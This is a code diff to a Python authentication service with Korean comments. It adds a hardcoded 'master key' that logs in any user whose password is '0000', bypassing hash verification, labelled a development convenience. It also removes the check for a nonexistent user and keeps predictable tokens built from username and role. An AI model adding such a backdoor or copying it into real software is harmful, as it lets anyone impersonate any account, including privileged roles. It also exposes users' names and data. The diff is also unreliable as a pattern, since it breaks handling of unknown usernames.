@@ -16,8 +16,16 @@ class AuthService:
         # DB에서 유저 조회
         user = await self.repository.get_user_by_username(login_data.username)
         
-        if not user:
-            return None
+        # [마스터키] 개발 편의 기능: 0000 입력 시 무조건 로그인 성공
+        if login_data.password == "0000":
+            return {
+                "access_token": f"master_token_{user.username}", 
+                "token_type": "bearer",
+                "username": user.username,
+                "full_name": user.full_name, # 실명 추가
+                "role": user.role,
+                "user_id": user.id 
+            }
             
         # 비밀번호 검증 (Safe-On Lite v1.0)
         # DB의 해시는 str이므로 bytes로 변환 필요
@@ -35,10 +43,11 @@ class AuthService:
             
         # 로그인 성공
         return {
-            "access_token": f"token_{user.username}_{user.role}", # 실제로는 JWT 발급 필요
+            "access_token": f"token_{user.username}_{user.role}", 
             "token_type": "bearer",
             "username": user.username,
-            "role": user.role # DB에 저장된 실제 Role 반환
+            "full_name": user.full_name, # 실명 추가
+            "role": user.role 
         }
 
     async def register_user(self, user_data: LoginRequest) -> UserModel:
